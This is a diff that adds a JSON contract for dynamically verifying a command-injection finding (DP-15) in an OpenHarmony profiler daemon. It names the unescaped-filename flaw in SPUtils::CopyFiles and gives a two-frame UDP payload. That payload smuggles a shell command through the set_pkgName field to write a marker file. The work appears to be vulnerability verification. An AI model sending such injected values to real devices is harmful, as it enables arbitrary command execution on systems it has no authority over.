@@ -1,0 +1,87 @@
+{
+  "schema_version": "vf.ohos.dynamic.contract.v2",
+  "contract_id": "GEN-DP-15",
+  "finding_ids": [
+    "DP-15"
+  ],
+  "unit_id": "developtoolsprofiler_dp-15",
+  "vuln_class": "command_injection",
+  "description": "SPUtils::CopyFiles 将未转义的文件名拼接到 shell 命令并执行，若攻击者可控制日志目录中的文件名则可能造成命令注入。",
+  "entry": {
+    "kind": "hap_udp",
+    "endpoint": "127.0.0.1:8283",
+    "reachability_identity": "hap_app",
+    "evidence": ""
+  },
+  "identity": {
+    "execution_identity": "hap_app",
+    "identity_ladder_fallback": "hap_app",
+    "max_evidence_grade": "A",
+    "drop_privs": null
+  },
+  "protocol": {
+    "descriptor_id": "sp_daemon_text",
+    "field_values": {
+      "set_pkgName": "smartperf;echo \"hack by nju\" > __MARKER_PATH__;#",
+      "catch_network_traffic": "x",
+      "mode": "udp",
+      "host": "127.0.0.1",
+      "port": 8283
+    },
+    "frame_sequence": [
+      "frame_first",
+      "frame_second"
+    ],
+    "inter_frame_delay_seconds": 0.3,
+    "param_space": {
+      "frame_first_template": "set_pkgName::smartperf;echo \"hack by nju\" > __MARKER_PATH__;#",
+      "frame_second": "catch_network_traffic::x",
+      "note": "set_pkgName 必须包含大小写敏感字面量 smartperf；其值写入 Dubai::dubaiPkgName，未过滤分号。catch_network_traffic 第二帧触发 CopyFiles/命令执行链；两帧间隔 0.3 秒。__MARKER_PATH__ 由 runner 注入。"
+    }
+  },
+  "fault": {
+    "operator": "payload_value_substitution",
+    "description": "第一帧在满足 smartperf 守卫的包名后追加 shell 命令；第二帧触发执行。",
+    "evidence": "SPUtils::CopyFiles(sp_utils.cpp:950-957) 将 CMD_COMMAND_MAP.at(CmdCommand::CP) 与未转义 cpStr 拼接后调用 LoadCmd；LoadCmdWithLinkBreak 将命令直接传给 popen，未见 shell 元字符过滤。",
+    "expected_guards": [
+      "udp_token_check",
+      "set_pkgName_requires_smartperf",
+      "two_frame_sequence"
+    ]
+  },
+  "oracle": {
+    "kind": "artifact_differential",
+    "artifact_forms": [
+      {
+        "form": "create",
+        "path": "__MARKER__",
+        "content_contains": "hack by nju",
+        "output_surface": "",
+        "output_is_dir": false
+      }
+    ],
+    "hilog_expectations": [],
+    "pattern_key": "run_pattern",
+    "refutation": [
+      "marker_path_unique_per_run",
+      "baseline_absent"
+    ],
+    "evidence": "注入 shell 命令通过重定向创建 runner 唯一路径 marker；marker 内容应包含 hack by nju。"
+  },
+  "risk": {
+    "target_process": "SPUtils::CopyFiles",
+    "risk_tier": "unknown",
+    "crash_oracle_allowed": false,
+    "restartable": false,
+    "rationale": ""
+  },
+  "cleanup": {
+    "remote_paths": [
+      "__RUN_DIR__"
+    ],
+    "restore_actions": [],
+    "verify": []
+  },
+  "compile_status": "ELIGIBLE",
+  "limitations": []
+}
